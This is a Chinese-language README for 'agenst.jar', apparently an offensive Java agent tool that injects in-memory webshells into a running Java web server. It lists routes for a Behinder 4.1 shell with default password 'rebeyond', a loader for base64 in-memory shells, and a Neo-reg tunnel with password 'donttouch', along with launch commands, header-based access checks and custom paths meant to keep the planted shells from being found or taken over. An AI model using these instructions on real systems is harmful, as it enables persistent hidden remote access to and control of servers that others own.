# 使用方式
扔到服务器上，`java -jar agenst.jar`即可。

如果需要添加参数（参见下述“自定义校验”与“自定义注入路径”），请尽量使用空格作为分隔符。

如运行报错，考虑：
1. 环境不正确，寻找一个jdk
2. 缺少dll或so文件，找一个attach.dll放在加载目录下（这是java agent注入的前置条件）

# 支持功能
1. 支持**冰蝎**、**Neo-reg**和**自定义的内存马**，内存马访问WEB进行注入。
2. 支持自定义校验机制，可采用请求头校验
3. 支持自定义注入路径，防止被捡走^ ^

## 默认条件启动
+ /agenstR 为冰蝎4.1 shell，默认密码为rebeyond
+ /agenstE 为自定义内存马加载器，使用POST方式在body处添加base64格式的内存马即可（内存马用JMG生成就行）
+ /agenstN 为Neo-reg代理，密码为`donttouch`，使用`python .\neoreg.py -k donttouch -u http://server.com/(..)/agenstN`

## 自定义校验
请在启动时使用参数-a=来指定一个请求头，格式为A:B。
如`java -jar agenst.jar -a=Referer:123456`（请求头与值请使用小写）。
此时所有路由都将开启校验。

## 自定义注入路径
1. 请在启动时使用参数-u=来指定一个路径，所有内存马路径将沿用这个路径代替字符串`agenst`如`java -jar agenst.jar -u=zhangwei`，则如冰蝎访问路径会变为/zhangweiR，以此类推（注入的filter等不沿用此规则）。
2. 使用参数-uR=或-uE=或-uN=来分别定义三种内存马的路径，如`java -jar agenst.jar -uR=myRebeyond`，则仅有冰蝎的路径变为/myRebeyond。

# Then
Enjoy ur PenTest, have fun!

by AugustTheodor